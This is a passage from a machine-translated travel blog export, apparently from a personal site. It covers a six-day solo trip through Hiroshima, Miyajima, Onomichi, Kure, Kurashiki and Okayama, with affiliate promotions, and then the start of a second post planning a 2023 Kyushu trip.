‚Äú‰∫àÁ¥Ñ„Åó„Åü„Åç„Å£„Å∑„ÅÆ„ÅäÂèóÂèñ„Çä‚Äù button. However, no matter how I tried or followed the steps, scanning the QR Code always showed a ‚ÄúQR Code invalid‚Äù error, and entering the order number also failed.Finally, after several attempts among a group of Taiwanese, we discovered that you need to use the yellow button labeled ‚ÄúQR„Ç≥„Éº„Éâ„ÅÆË™≠Âèñ„Çä‚Äù at the bottom left to redeem. Clicking it allows you to scan the QR Code directly. (It is suspected that the JR machine has been updated)The machine will print two manuals and one JR Pass (the ticket with the ‚úî in the picture). After receiving the JR Pass, you can insert it into completed seat reservation. Use the JR Pass ticket for entering and exiting stations. The seat reservation ticket is only for reference to seat and time and cannot be used for station entry or exit.I was really hungry and hadn‚Äôt eaten anything, so I went to a convenience store to grab some food to fill my stomach before taking a later JR train.Around 16:45, arrive at Hiroshima Station.First, check in at the hotel and drop off your luggage before going out to find food. When there are no baseball games, this street is quite quiet. Right across is the railway, and there aren‚Äôt many shops on the road, but luckily there is a large Lawson convenience store.Hiroshima Okonomiyaki Story Station SquareReturn to the station to eat Hiroshima-style okonomiyaki at Hiroshima Okonomiyaki Story Station Square. It is on the right side after exiting Hiroshima Station, on the 6th floor (next to Ekie Department Store). As soon as you get off the elevator, it feels unique‚Äîthis entire floor is filled with Hiroshima-style okonomiyaki restaurants, so you can choose your favorite one to sit in.I ordered a Hiroshima-style okonomiyaki with added rice cakes (it contains fried noodles). The taste was just okay. It had noodles and rice cakes inside, and I felt very full after eating.On the way back to the hotel, I bought a late-night snack to eat. The night in Hiroshima is very cold at this time, only about 4 degrees.Room Unboxing.Opening the curtains reveals the railway outside (about 10 tracks, so you need to cross the railroad quickly); the downside of the room is the clicking sound when trains pass by.Allite A1 65W GaN Fast Charger + Allite Liquid Silicone Fast Charging CableThis trip, I brought the Allite A1 65W GaN Fast Charger + Allite Liquid Silicone Fast Charging Cable combo. Since switching to the iPhone 15, all my devices now use Type-C ports; when traveling, just bringing a Type-C charging cable solves everything.Allite A1 65W GaN Fast Charger supports single-port 65W and dual-port 45W+18W fast charging; its compact size makes it portable. When you see a power outlet outside, just plug it in to recharge. Back at the hotel, you can charge your power bank with one port and your phone, watch, iPad, or Switch with the other‚Äîconvenient and fast.Allite Liquid Silicone Fast Charging Cable (1.5m) is long enough to connect a power bank inside your bag. The liquid silicone material differs from regular plastic; it is skin-friendly, more flexible for easy storage, and does not deform easily.The best charging companion for this trip.Day 2 Miyajima (Itsukushima Shrine), Momijidani Park, Shishiyama Observatory, Atomic Bomb Dome, Peace Memorial Park KKday itinerary reference: Japan. Miyajima | Momijidani Park ¬∑ Visit Daisho-in Temple, Itsukushima Shrine | Rickshaw Experience Hiroshima and Miyajima Bus One-Day TourMiyajimaEarly in the morning, take the JR to Miyajimaguchi Station. Exit the station and walk toward the ferry terminal to find the ferry station. The JR Pass includes the Miyajima ferry ticket, so you don‚Äôt need to buy a separate ticket. However, you must pay an additional Miyajima Visit Tax (¬•100). Station staff will guide you to purchase the visit tax ticket. You can also take the Hiroden tram to Miyajimaguchi, but I remember it takes longer.The ferry takes about 10 minutes to reach Miyajima. The ride is smooth and free of diesel smell. As you approach, you can see the floating torii gate from afar!After arriving on the island, head straight towards the sea torii gate. Taking photos diagonally from the shore along the way is also beautiful and less crowded.There are many wild deer on the island that randomly bite things XD.After passing Itsukushima Shrine, head to the Miyajima Ropeway and get off at the Shishiiwa Observatory.You need to take two cable cars to reach the Lion Rock Observation Deck. The advantage of heading straight to the cable car is that there are almost no people (while Itsukushima Shrine at the foot of the mountain is crowded). The first cable car is a small one that fits up to 6 people (frequent departures, longer distance). The second cable car is larger (if I remember correctly, it departs every 15 minutes, can hold about 20 people, and covers a very short distance).From the summit, you can overlook the entire Seto Inland Sea, enjoy the breeze, and admire the small islands. It‚Äôs very relaxing.Itsukushima Shrine is built right on the seaside, with very clean water and a peaceful atmosphere; you can also line up to take photos of the floating torii gate from the front.The low tide at this season occurs at 3 AM or 5 PM, so there was no chance to see the rocky island shrine and torii gate during low tide this time.For lunch, you must have oysters. Kakiya offers oyster rice and fried oysters, each costing just over 300 TWD. Delicious and affordable, oyster feast!Miyajima Ropeway and Itsukushima Shrine Tickets.Bought a small Itsukushima Shrine torii gate to keep at home. It‚Äôs very cute!Atomic Bomb Dome, Peace Memorial ParkIn the afternoon, return to Hiroshima city center and visit the Atomic Bomb Dome and Peace Memorial Park.Autumn in Hiroshima features the yellow of ginkgo leaves, the red of maple leaves, and touches of green leaves, all accompanied by the cool autumn breeze, reflecting on everything that once happened in Hiroshima. At Peace Memorial Park, I saw many Japanese elementary and middle school outdoor classes, with teachers explaining history. It deeply reflected the Japanese people‚Äôs focus on passing down historical education.Return to the hotelNear evening, returned to the hotel to rest because wearing too little, it was too cold outside.For dinner, I bought a takeout grilled meat bento from ‚ÄúÁÇ≠ÁÅ´ÁÑºËÇâ Êïè ÁåøÁå¥Ê©ãÂ∫ó‚Äù on the way back to the hotel. What first caught my eye was the several charcoal grills outside the store, which made the place feel very warm. I stopped to check the sign and saw they offered takeout bento, so I went inside!Another novel feature is that his lunch box has a self-heating function. When you return to the hotel and want to eat, just pull a string, and it will start heating itself, releasing steam; no matter when you eat, it feels freshly cooked and hot, very thoughtful.Tonight‚Äôs convenience store late-night snack: hot dog, fried chicken, Strong Zero, and I also bought a bottle of Yakult Y1000, which claims to help you sleep well. (But I already slept well today after walking all day)Day 3 Onomichi, Senkoji, Fukuyama, TomonouraIn the morning, take the Shinkansen to Mihara, then transfer at Mihara to Onomichi Station.The timing was off, and I ended up waiting over 30 minutes when transferring from Miyahara to Onomichi.Exit south and walk through the main entrance of Oshima Station.The weather was good and the temperature was comfortable. After leaving Onomichi Station, I headed straight to Senkoji Temple. Walking on the mountain side felt like walking through Jiufen mountain town. The path was not easy, with many stairs and steep slopes going up. Looking to the other side, you could see the Seto Inland Sea of Onomichi, which offered a nice view.Another option is to walk along the main road until you see the sign for the Senkoji Ropeway. Turn in there to take the ropeway directly up to Senkoji.The scenery at Senkoji Temple is beautiful, offering a bird‚Äôs-eye view of the entire Onomichi city and the distant Onoshima Bridge.I brought home a cute little Jizo statue (you can choose to write a wish and offer it at Senkoji Temple or take it home as a keepsake):After visiting Senkoji Temple, head down to find the Cat Alley.Early online articles often introduced the Cat Alley by Japanese traveler Kohtou, but my visit this year felt different; Cat Alley is a short path descending from Senkoji Temple, and I didn‚Äôt see a single stray cat. Most of the cat cafes along the way were closed, making the walk feel a bit lonely. In the end, I found a cafe still open, „Éñ„Éº„Ç± „ÉÄ„É´„Éñ„É´, where I had a coffee and took a break.The store has a good location, but the walk up gives off a lonely, overgrown weed vibe. The shop has few seats and limited menu options; however, the owner is very friendly, and the shop cat is affectionate, often coming to sit close to you.On the way back down to the main street, I came across a very quiet local shrine.On the way back to Onomichi Station, we took a route through the shopping street inside and had lunch at the famous Onomichi ramen ‚Äî ‚ÄúOnomichi Ramen Shoya‚Äù.Onomichi Ramen (founded by Taiwanese) is quite unique, featuring a floating layer of white pork back fat and dried bamboo shoots.After leisurely strolling back to Onomichi Station, since it was still early, I decided on the spot to visit the nearby city of Fukuyama. I miscalculated the time again and ended up waiting an extra 30 minutes for the bus. Friends heading to Onomichi, make sure to plan your time well.FukuyamaFrom the back exit of Fukuyama Station, you can see Fukuyama Castle. We didn‚Äôt go inside; just took a photo from a distance and left.TomonouraBack at Fukuyama Station‚Äôs front exit, you can see bus directions to ‚ÄúTomonoura.‚Äù At first, the map made Tomonoura seem hard to reach since it‚Äôs a seaside town, but I have to admire Japan‚Äôs tourism and transportation signs‚Äîthey are very clear. p.s. I didn‚Äôt do any special research on Tomonoura before the trip; it was a spontaneous decision to visit. My knowledge of Tomonoura includes it being the filming location for Ponyo on the Cliff, Japan‚Äôs first modern port city, the negotiation site of Sakamoto Ryoma, and a must-visit for history enthusiasts.After boarding, stay on the bus until the last stop, which is Tomonoura (approximate travel time: 40 minutes).Xianzu IslandRefer directly to the local tourist map and decided to visit Xianzui Island to enjoy the scenery first.After getting off, walk back directly to ‚ÄúFukuyama City Ferry Terminal‚Äù to take the ferry to Senzui Island (about 10 minutes).The boat has a vintage charm, giving a sudden feeling of becoming a pirate king. Although the trip is short, you can enjoy a bird‚Äôs-eye view of the Seto Inland Sea and Senchui Island, feel the breeze, and relax comfortably.After arriving on the island, no pedestrians were seen. The island was desolate, the original Tomonoura Beach Visitor Center was closed and set for demolition, and the trails leading to other coastal areas up the mountain were all closed due to falling rocks. Only a bathhouse hotel at the entrance was still open.Tomonoura Beach now holds only a vast, peaceful shoreline, with the occasional sound of a group of sea ducks playing. (It was my first time seeing saltwater ducks, not saltwater chickens.)Stayed for about 15 minutes, with nowhere else to go, so waited for the ferry back; although this place is desolate, there is still a vending machine! On the way back, took a closer look at Benten Island in the distance, a small lonely island standing in the sea with a torii gate.TomonouraReturning to Tomonoura, it was nearing evening. Strolling to the harbor to see the lighthouse and the Japanese town scenery, many locals and photography enthusiasts were already sitting on the steps by the harbor, setting up their cameras, waiting for the sunset.Tomonoura is famous for its nourishing health tonic wine, and the strong scent of medicinal wine filled the streets. Since I needed to hurry back to Hiroshima, I took the bus back to Fukuyama before it got dark.After returning to Fukuyama, we immediately boarded the train to Hiroshima, bidding farewell to this quiet and peaceful city. Dinner was still takeout grilled meat bento from ‚Äú Sumibiyaki Yakiniku Bin Enkobashi Branch ‚Äú on the way back to the hotel.Additionally, I added two more convenience store fried oysters (only 100 yen each).Late-night snacks are still convenience store hot foods priced over Y1000.Day 4 Final Tour of Hiroshima City and Surroundings (Hiroshima Peace Memorial Museum, Hiroshima Castle, Shukkeien Garden)Checked out from Toyoko INN early in the morning and dragged luggage to the APA Hotel Hiroshima, where I will stay tonight.After storing our luggage, we walked back to Hiroshima Station to take the train to Kure City (about 50 minutes). Approaching Kure, looking out the right-side window gave a feeling similar to the train route from Fulong to Yilan, with mountains on the left and the sea on the right, creating a relaxing scenery.After exiting the station, you can visit the tourist information center to get the travel guide for Wu City. (I think the design is great!)Following the signs, you can walk from the station via the skybridge all the way to the Yamato Museum and the JMSDF Kure Museum at the port.When you reach the end, don‚Äôt rush to get off the skybridge. From the skybridge, you can get a great view of the Maritime Self-Defense Force Museum ‚Äî Submarines. For friends planning to visit Kure City and Hiroshima, here is a suggested itinerary. From Kure City, you can take a boat to Miyajima and then return to Hiroshima. I originally planned to take the boat back to Hiroshima, but missed the timing, so I gave up on it this time.Yamato MuseumInside, there is a Yamato battleship model that can be viewed up close in 360 degrees, with almost full detailed accuracy. There are also exhibits on battleships, war history, fighter planes, cannons, and more‚Äîan unmissable experience for battleship and military enthusiasts. Additionally, there is a special exhibition on Japanese aircraft carrier design and development history, including original design manuscripts.JMSDF Kure MuseumAfter leaving the Yamato Museum, walk towards the back to find the JMSDF Kure Museum, which offers free admission.The museum mainly exhibits the living and working environments inside the submarine, its engine, torpedoes, and history.Finally, the most special part is being able to enter the submarine and visit the real engine room, dormitory, captain‚Äôs cabin, control room, and use the periscope to view the outside environment.Wu City Shopping StreetAfter visiting the museum, it was nearly noon and time to find something to eat. I originally planned to try the Navy curry, but after checking the reviews, it didn‚Äôt seem special. So, I walked back to Wu City Shopping Street to decide. (Actually, it was quite far and in the opposite direction, taking about 30 minutes on foot.)Finally, we chose to eat Wu City Cold Noodles, which are similar to cold noodles with pork bone char siu. The noodles are chilled, giving a refreshing taste. The portion is quite large, so a small size is enough.After eating, we prepared to head back to the station. On the way, we also bought ‚ÄúFuzhu Deep-fried Red Bean Cake,‚Äù which was sweet and oily, tasting quite ordinary. Additionally, we picked up Navy Coffee and curry as souvenirs (subarucoffee_store/), where the staff were very friendly and enthusiastic.Walk back to Go Station and take the train back to Hiroshima.After returning to Hiroshima, the final city tour begins. Right outside Hiroshima Station, there are three sightseeing bus routes available (included in the JR Pass). You can choose based on the direction you want to go.I want to visit Shukkeien Garden (Hiroshima Museum of Art) first, so I chose to take the Red Maple Leaf tram.Shoujing GardenShukkeien Garden is located right behind the Hiroshima Museum of Art. You can also buy a combined ticket for both Shukkeien Garden and the Hiroshima Museum of Art.Shukkeien Garden is a charming small courtyard featuring many miniature landscapes, such as maple leaves, small bridges with flowing water, bamboo groves, pine and cypress trees, hills, and more. It‚Äôs quite nice to walk around and enjoy the scenery.Hiroshima CastleNext stop, a stroll to Hiroshima Castle. The original Hiroshima Castle was destroyed in the atomic bombing. The current castle is a rebuilt version, which looks quite new. It is not very tall, so the main keep does not offer much of a view.Peace Memorial Museum, Peace Memorial ParkThe last stop returns to Peace Memorial Park, right next to the Paper Crane Tower (not very tall, did not go inside).I happened to meet Shingo Katori in the afternoon, who came to pay his respects.Queueing to buy tickets to visit the Peace Memorial Museum, which contains extensive information on the nuclear explosion process, history, as well as photos and artifacts; the overall visit is very heavy and impactful.On the other side of the park, there is a prayer hall, but it felt too heavy, so I didn‚Äôt go in.In the evening, a light drizzle began to fall. With the heavy feelings from just witnessing the painful lessons of history, I returned to Hiroshima Station.I casually bought some souvenirs and takeout bento at the station, then returned to the hotel to rest. I still need to do laundry today.APA really is everywhere: President Curry, President Water, President‚Äôs Books‚Ä¶The room density is as usual, quite dense, with over 60 rooms per floor.The room is still small but fully equipped, with convenient electronic features (you can check the laundry status and AirPlay directly to the TV from the room).Had a big problem doing laundry‚Äîlong lines everywhere. The entire building with over 1,000 rooms had only 7 washing machines. Finally timed it right and went downstairs to queue when a machine was about to finish. Ended up finishing washing and drying clothes after 11 PM (still not dry, so continued air-drying in the room).Staying up this late, having a midnight snack is totally reasonable! Still going with Y1000 + milk + convenience store hot food.Day 5 Kurashiki, OkayamaThe morning was bright and sunny; after checking out of the hotel and saying goodbye to Hiroshima, we headed to the hotel in Kurashiki to drop off our luggage (you can also leave your luggage in Okayama first, since you need to go through Okayama to get to Kurashiki).Kurashiki Bikan District, Achi ShrineThe first stop is Achi Shrine, located at a higher elevation with a panoramic view of the entire Kurashiki area. It‚Äôs quiet with few people around.Achi Shrine is small but famous for its Ema Pavilion. If you draw a bad fortune slip, you can tie it to the corresponding zodiac animal head. There is also a charm for good relationships called Hanatsunamori:Hua Chan Shou, thanks to Angie for sharing.The scenic area is not large but very quiet and pleasant to explore. The boat tour was sold out for the day, so I couldn‚Äôt experience it, but walking around the nearby alleys was also very enjoyable.For lunch, I had the famous Miyake Shoten curry set. The rich curry paired well with shredded burdock and was very tasty.After eating, continue exploring. When tired, go to „Éë„Éº„É©„ÉºÊûúÁâ©Â∞èÁî∫ to try their fruit parfaits. The staff wear Taisho-era maid outfits. The parfait features Okayama Seio grapes and fruit ice cream, with grapes so sweet they tingle.You can buy souvenirs like GOHOBI, Kurashiki specialty collagen Okayama fruit jelly.Okayama Korakuen Illumination and Okayama CastleTaking the train back to Okayama Station at sunset, you can directly take the tram from the station to reach the area around Okayama Castle.The first stop is Okayama Korakuen Garden. The evening illumination creates a romantic and beautiful atmosphere. Okayama Korakuen + Okayama Castle hold a lighting event every year in mid to late November.On the way, visit the nearby Okayama Castle to see the night view. The maple leaves illuminated by lights create a unique atmosphere.Dinner was easy to handle; I ate at Ippudo Ramen nearby, then strolled back to Okayama Station (the street lights were beautiful). Before heading back to Kurashiki, I had some time to browse Don Quijote, but there weren‚Äôt many souvenirs. For souvenirs, you still need to go to Okayama Station or department stores‚Ä¶Returning to Kurashiki was already in the evening. The weather was cold, and people on the street were rushing home. The outlet behind Kurashiki Station was also closed.I just realized this hotel doesn‚Äôt have a 24-hour front desk, luckily I didn‚Äôt come back too late! But the room facilities are well-equipped, including a microwave, electric kettle, and even a glasses cleaner.On the last night in Japan, I simply ate convenience store chicken nuggets plus Y1000 and bought an extra bottle of white peach strawberry milk as a midnight snack, then fell into a deep sleep.Day 6 Okayama, Return TripEarly in the morning at dawn, I checked out and headed to Okayama. Planning to take the airport shuttle bus from Okayama back to the airport. Kurashiki also has direct shuttle buses to Okayama Airport, but the frequency is lower ( see official website for details ). Yesterday, since we hadn‚Äôt finished exploring Okayama, we decided to head straight to Okayama and then return from there.Kibitsu ShrineAfter getting off at the station, head straight to Kibitsu Shrine (about a 30-minute drive). From the station, it‚Äôs about a 15-minute walk to reach the shrine. There is a historic cypress corridor, ginkgo trees, and historic buildings, making it a pleasant place for a walk and worship.On the way, there is also Kibitsuhiko Shrine on the other side of the mountain at the foot, which can be visited along the route. However, due to limited time, we skipped it this time.Okayama AEONAfter returning to Okayama Station, I went to the nearby AEON mall to buy some souvenirs and stroll around. I had tempura soba for lunch, then got ready to line up for the airport shuttle back to Okayama Airport. Many people are lining up for the shuttle bus, but don‚Äôt worry about missing it. Extra trips will be added to make sure everyone can get to the airport.Okayama Momotaro Airport (OKJ)The airport is a bit old and about the same size as Kumamoto Airport. By around 13:50, I had completed security check, check-in, and immigration, leaving nearly 2 hours before the 15:25 departure.There are very few flights at the airport, so only passengers on the same flight are present. It takes less than 15 minutes to complete check-in and baggage drop. What‚Äôs special is that Okayama Airport is so small that the X-ray machine is placed in the airport lobby. After passing through the X-ray, a seal is attached before proceeding to check-in (if you open your luggage, you will be required to go through security again).After checking in my luggage, I wandered around the terminal (which only has two floors). There is an observation deck with a view, as well as a caf√© and several restaurants where you can eat. When I got tired, I bought a white peach ice cream to enjoy.Security check is also quick, but at Okayama Airport, you need to take off your boots for inspection, which is a bit inconvenient.When facing a flight delay, waiting in the lounge and finally taking off at 16:24 (almost an hour late). Goodbye, Okayama, goodbye, Hiroshima.Unboxing SouvenirsInterludeFollowing the last trip ‚Äú2023 Kyushu 10-Day Solo Travel,‚Äù I felt an indescribable loneliness in the days after. First, I was alone in a strange place; second, I couldn‚Äôt speak Japanese and hardly spoke during the 10 days. That feeling of loneliness is still vivid in my memory, so I wasn‚Äôt eager to go again. It was only because I was about to start work and happened to get a super discounted ticket that I decided to go.On the first day, when exchanging the JR Pass, I got stuck just as a group of Taiwanese travelers did. We took turns trying and finally succeeded. She was also going to Hiroshima and got stuck entering the station, so I reminded her. We both bought tickets for the next train after rush hour, she chose a non-reserved seat, and we both wanted to stop by a convenience store first. Since we work in the same industry, we had plenty to talk about, and both of us were traveling alone. So, on the first day, we ended up forming a group and completing the same itinerary together. Many of the itineraries, attractions, and time arrangements were provided by Angie. If I had planned on my own, I might have wandered aimlessly or missed places, then ended up walking alone for 6 days.‚Äî ‚Äî ‚ÄîKKday Promotion üõí Japan JR PASS | Tottori &amp; Matsue Area Pass | eMCO E-ticket Japan eSIM CardsÔΩúDaily High-Speed, Total Data, Unlimited Data Plans Japan JR PASSÔΩúSanyo &amp; Sanin Area Rail PassÔΩúeMCO E-ticket(Explore the entire Sanyo and Sanin regions in one trip) Japan JR PASS | Kansai &amp; Hiroshima Area Rail Pass | eMCO e-Ticket Orizuru Tower Ticket (Hiroshima City, Hiroshima Prefecture) Japan. Miyajima | Momijidani Park, Visit Daisho-in Temple, Itsukushima Shrine | Rickshaw Experience Hiroshima and Miyajima Bus One-Day Tour If this article is helpful to you, please consider using my referral link to purchase KKday products and tours. I will receive a portion of the proceeds to continue creating more travel content. Thank you.More Travel Stories [Travelogue] 2025 Busan, South Korea 8 Days 7 Nights Free Travel [Travelogue] 2024 San‚Äôin Wide Area: Shimane, Izumo, Matsue, Tottori, Himeji, Osaka, Kobe 7-Day Solo Trip [Travelogue] 2024 Second Visit to Kyushu 9-Day Independent Trip, Entering via Busan ‚Üí Hakata Cruise [Travelogue] 2023 Kyushu 10-Day Solo Trip [Travelogue] 9/11 Nagoya One-Day Quick Trip [Travelogue] 2023 Tokyo 5-Day Free Trip [Travelogue] 2023 Kyoto-Osaka-Kobe 8-Day Free Trip If you have any questions or suggestions, feel free to contact me.More Travelogues Tokyo Area Travel GuideÔΩúKawagoe Little Edo &amp; Atami Fireworks Festival 5-Day Itinerary Busan Travel GuideÔΩú8-Day Itinerary with VISIT BUSAN PASS for Seamless Exploration San‚Äôin &amp; Kansai 7-Day Solo TripÔΩúExplore Izumo, Matsue, Tottori, Himeji, Osaka, Kobe Bangkok Travel GuideÔΩú5-Day Independent Trip Highlights in Thailand Kyushu 9-Day Independent TripÔΩúBusan to Hakata Cruise Entry and Scenic Tours Sanyo Region Travel GuideÔΩú6-Day Hiroshima &amp; Okayama Itinerary for Freedom Seekers Kyushu 10-Day Solo Travel GuideÔΩúExplore Fukuoka, Nagasaki &amp; Kumamoto Efficiently Nagoya One-Day Quick TripÔΩúPeach Aviation Flight Experience and Travel Tips Tokyo 5-Day Travel GuideÔΩúTop Tips for Food, Stay &amp; Transport Kyoto Osaka Kobe 8-Day ItineraryÔΩúFree Travel Guide with Food, Stay &amp; Transit TipsFound this guide useful? Use my KKday referral link to book your trip‚ÄîI‚Äôll earn a small commission to support more content like this. Thank you! üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Kyushu 10-Day Solo Travel GuideÔΩúExplore Fukuoka, Nagasaki & Kumamoto Efficiently", "url": "/posts/travel-journals/kyushu-10-day-solo-travel-guide-explore-fukuoka-nagasaki-kumamoto-efficiently-d78e0b15a08a/", "categories": "Travel Journals", "tags": "english, ai-translation, life, japan, kyushu, fukuoka, kumamoto", "date": "2023-10-04 12:46:37 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 2023 Kyushu 10-Day Solo TripKyushu 10-Day Independent Trip: A Qui...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 2023 Kyushu 10-Day Solo TripKyushu 10-Day Independent Trip: A Quick Tour of Fukuoka, Nagasaki, and Kumamoto[2024 Update] Second Visit to Kyushu Second Visit to Kyushu in June 2024 (9 Days + 2 Days in Korea)Entering Japan Hakata from Busan, Korea via the New Camellia Cruise, Touring Yufuin, Oita, Fukuoka, Shimonoseki, Itoshima, SaseboPrefaceAt the end of August, I officially left Pinkoi after nearly three years. I had been considering leaving for a while. Earlier this year, I decided to take a break and travel to clear my mind, then reassess the situation. So, I went with friends on the trip ‚Äú[Travelogue] 2023 Kyoto-Osaka-Kobe &amp; üáØüáµ First Landing‚Äù and with colleagues on ‚Äú[Travelogue] 2023 Tokyo &amp; üáØüáµ Second Landing‚Äù. However, after returning, I felt an even stronger desire to truly break free. Since my tasks were wrapping up, I gathered my courage, stepped out of my comfort zone, and sought my next challenge!„Äå [Travelogue] 9/11 One-Day Flash Trip to Nagoya „Äçwas purely accidental. As mentioned in the text, it felt more like a march than a relaxing trip.Taking advantage of a rare free moment to explore Japan again, the original plan was to go with a friend who is also unemployed on the route üá∞üá∑ Busan ‚û°Ô∏è üáØüáµ Fukuoka ‚û°Ô∏è üáØüáµ Kumamoto; traveling from Korea to Kumamoto and back. Between Busan and Fukuoka, we could take the Shin Camellia, sleep for 12 hours, and arrive in Fukuoka‚Äîessentially combining commuting and accommodation.My friend started working in September and couldn‚Äôt find a new travel companion for a while; I didn‚Äôt want to travel far alone, so I gave up the üá∞üá∑ Busan ‚û°Ô∏è üáØüáµ Fukuoka segment and changed to üáØüáµ Fukuoka ‚û°Ô∏è üáØüáµ Kumamoto, traveling from Fukuoka to Kumamoto and back.Starting from October, my schedule is quite scattered, and I also plan to begin looking for a new job in October. So, I set the departure date at the end of September (9/17‚Äì9/26).Summary / RetroWrite the summary and review first. I really liked a quote I saw in a travel group: ‚ÄúIndependent travel is constantly paying tuition (spending time or money) to learn. The more experience you have, the fewer pitfalls you encounter.‚Äùüëç Coca-Cola, peach water, FamilyMart‚Äôs fruit juice drinks, Qiuyamei plum wine, all delicious! Japanese professional baseball is worth watching! When buying tickets, remember to buy an entire row with empty seats or seats near the aisle. Cheap seats are fine. JR Pass is not always cost-effective, but it really saves money in Kyushu! At least over 1,000 TWD saved. Traveling alone also brought many interesting experiences; for example, helping a Japanese family get souvenirs in Mihara City, a kind foreign sister offering to take photos, a Taiwanese family we met on the boat, a TSMC elder brother who walked Aso with me, helping a stranger family take photos in Kumamoto and then meeting them again at the airport to take more photos, and so on. Kumamon, the Kumamoto mascot, can be found all over Kyushu (not just Kumamoto). The entire Kyushu region is very spacious and not crowded. Famous restaurants and attractions rarely require waiting in line, making it very comfortable. Japanese has slightly improved; can understand numbers (though still need to confirm pronunciation with Google Translate), can understand whether to use a plastic bag; knows phrases for checkout, this one, that‚Äôs all, cash, credit card, and tax-free imperative sentences (XXX „ÅäÈ°ò„ÅÑ„Åó„Åæ„Åô). Travelogue completed! üëé This time I stayed at a bad hotel:When booking hotels in Japan, always check the reviews. It‚Äôs best to read the low-rated reviews to see if you can accept the issues. Then, use street view to check if the location is convenient to walk around. This time, we spent too many days in Kumamoto; 2 days would be enough. The other days can be spent in Oita. Also, Fukuoka is actually much closer to Kumamoto than to Nagasaki.In the past, we always found accommodations first and then looked for attractions. Since Kyushu is vast, we should first choose the places we want to visit and then arrange accommodations. This way, we can visit more attractions. The options, prices, and quality of accommodation in Fukuoka are much better than in Kumamoto. This time I missed the Yufuin festival (I went to Nagasaki that day):Later, you can check if there is a festival on the date you visit. Everyone recommends the festival; you must go. JR Pass can be used on Shinkansen, but the ‚ÄúNozomi‚Äù and ‚ÄúMizuho‚Äù trains are not allowed; you must pay an extra fare if you take them. Solo traveling + language barriers can be quite lonely; more often, it‚Äôs about quietly enjoying solitude. Solo travel accommodation is relatively more expensive. This time, I still rushed through the sights. I should slow down to enjoy the moment and find good food; especially in Japan, famous restaurants are often closed after meal times. The sun in Kyushu is still strong this season, so make sure to apply sunscreen. Northern Nagasaki is more popular for Dutch influences and Chinatown, while Southern Nagasaki is known for its distinctive night views. KKday Promotion Japan JR PASSÔΩúKyushu Area Rail PassÔΩúNorth Kyushu &amp; South Kyushu &amp; All KyushuÔΩúE-ticket Japan Nagasaki | Kyushu Huis Ten Bosch Ticket Huis Ten Bosch Japan eSIM CardÔΩúDaily High-Speed, Total, Unlimited Data Plans Fukuoka NishitetsuÔΩúDazaifu Tenmangu + Yanagawa Boat Tour Sightseeing PassÔΩúPick up at Fukuoka Airport International Terminal Japan Fukuoka teamLab Forest Fukuoka Ticket ‚Äî SBI SecuritiesÔΩúCheck Now „ÄêSolo Tour„ÄëOne-Day Tour in Kyushu, JapanÔΩúTakachiho Gorge &amp; Amanoiwato Shrine &amp; Amano Yasugawara (Includes Special Aso Akaushi Grilled Beef Set)ÔΩúDeparture from Fukuoka One-Day Tour in Kumamoto, KyushuÔΩúAso Nakadake Volcano, Kusasenri, Kumamoto Castle, Suizenji Jojuen Garden / All-You-Can-Eat Seasonal FruitsÔΩúDeparting from Fukuoka Hakata (Chinese, English, Japanese Supported) Preparation WorkWalkInitially, I considered flying into Fukuoka and out of Fukuoka, with a one- or two-day round trip to Kumamoto (which later proved to be the right choice XD, as Kumamoto doesn‚Äôt have many attractions and doesn‚Äôt require many days). I found a China Airlines flight flying into Fukuoka and out of Kumamoto that was $1,000 cheaper, so I decided on that flight.Because there was plenty of time, I chose the most luxurious schedule, departing at noon and returning at noon, totaling 10 days including flight time. Outbound: 9/17 CI 116 16:40 TPE -&gt; 20:00 FUK Return: 9/26 CI 2195 ( New flight on 9/26 ) 12:30 KMJ -&gt; 13:34 TPE Price: $10,048Because Kyushu is vast, I bought the JR Pass Northern Kyushu Rail Pass (5 days), thinking that no matter how much I travel, it would be worth it.Accommodation (9 nights)I didn‚Äôt think much or research when planning; I just figured I hadn‚Äôt been to Fukuoka or Kumamoto, so I split the trip roughly half and half: 5 days in Fukuoka, 4 days in Kumamoto.Fukuoka 5 Nights ‚Äî Benikea Calton Hotel Fukuoka Tenjin ( Benikea Calton Hotel Fukuoka Tenjin ) Price: $7,583, $1,516/night Transportation: From Hakata Station, take the Nanakuma Subway Line to Watanabe-dori Station or take a bus and walk 5 minutes to the destination. Kumamoto 4 Nights ‚Äî Green Rich Hotel ‚Äî Suizenji ( Green Rich Hotel Suizenji )JR Kumamoto -&gt; HotelHotel -&gt; Kumamoto AirportFinding accommodation in Kumamoto is very difficult (not sure if it‚Äôs because TSMC business trips have booked most places), with limited options, higher prices than Fukuoka, and older facilities; in the end, this was the only relatively affordable hotel found. Price: $8,157, $2,039/night Transportation: After exiting JR Kumamoto Station, transfer to the H≈çhi Main Line, then take the tram to Shimin Taiikukan-mae Station. Returning to the airport is also very convenient, with direct airport buses available right outside to Kumamoto Airport. Once the hotel is booked, you can fill out the online Entry Reservation Application.JoyThe original plan was as follows: 9/17 21:00 Arrive in Fukuoka22:00 Check in at the hotel, then probably stroll around the nearby outdoor food stalls 9/18 Nagasaki (Shinchi Chinatown / Dutch Slope / Glover Garden / Oura Church / Gunkanjima Digital Museum / Meganebashi) not all will be visited + Atomic Bomb Museum + Peace Park + evening at Inasayama Observatory for night view 9/19 Yanagawa and Dazaifu One-Day Tour + LaLaport Fukuoka (optional) 9/20 Mojiko, Kokura Castle One-Day Tour + Yatai Food Stalls 9/21 Shopping in Hakata (Fukuoka Tower, Shrine, Canal City, Tenjin Underground Shopping Mall‚Ä¶) 9/22 Hakata Shopping + Travel to Kumamoto + Suizenji Jojuen Garden 9/23 Kumamoto City, Kumamoto Castle, Meeting Kumamon the Mascot 9/24 Aso Volcano One-Day 